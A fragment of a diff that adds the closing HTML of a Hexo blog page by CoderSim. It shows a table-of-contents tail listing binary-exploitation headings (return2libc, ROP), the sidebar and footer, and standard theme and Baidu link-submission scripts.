class="nav-link" href="#return2libc"><span class="nav-number">8.2.</span> <span class="nav-text">return2libc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROP"><span class="nav-number">8.3.</span> <span class="nav-text">ROP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考文献"><span class="nav-number">9.</span> <span class="nav-text">参考文献</span></a></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/assets/blogImages/headImag.jpg"
+      alt="CoderSim">
+  <p class="site-author-name" itemprop="name">CoderSim</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">32</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">categories</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">31</span>
+        <span class="site-state-item-name">tags</span>
+        </a>
+      </div>
+    
+  </nav>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">CoderSim</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.4.0</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+
+
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
